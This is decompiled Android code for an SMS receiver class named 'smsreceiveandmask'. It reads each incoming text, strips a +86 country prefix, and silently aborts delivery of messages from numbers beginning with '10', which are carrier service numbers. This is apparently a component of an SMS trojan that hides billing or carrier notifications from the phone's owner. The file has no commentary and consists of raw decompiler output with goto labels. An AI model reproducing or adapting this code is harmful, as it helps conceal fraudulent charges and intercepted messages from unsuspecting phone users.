// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package fish;

import android.content.*;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class smsreceiveandmask extends BroadcastReceiver
{

    public smsreceiveandmask()
    {
    }

    public void onReceive(Context context, Intent intent)
    {
        StringBuilder stringbuilder;
        StringBuilder stringbuilder1;
        Bundle bundle;
        stringbuilder = new StringBuilder();
        stringbuilder1 = new StringBuilder();
        bundle = intent.getExtras();
        if(bundle == null) goto _L2; else goto _L1
_L1:
        Object aobj[];
        SmsMessage asmsmessage[];
        int i;
        aobj = (Object[])bundle.get("pdus");
        asmsmessage = new SmsMessage[aobj.length];
        i = 0;
_L5:
        if(i < aobj.length) goto _L4; else goto _L3
_L3:
        int j;
        int k;
        j = asmsmessage.length;
        k = 0;
_L6:
        if(k < j)
            break MISSING_BLOCK_LABEL_147;
        String s = stringbuilder1.toString();
        if(s.contains("+86"))
            s = s.substring(3);
        boolean flag = false;
        if(s.startsWith("10"))
            flag = true;
        if(flag)
            abortBroadcast();
_L2:
        return;
_L4:
        asmsmessage[i] = SmsMessage.createFromPdu((byte[])aobj[i]);
        i++;
          goto _L5
        SmsMessage smsmessage = asmsmessage[k];
        stringbuilder.append(smsmessage.getDisplayMessageBody());
        stringbuilder1.append(smsmessage.getDisplayOriginatingAddress());
        k++;
          goto _L6
    }
}
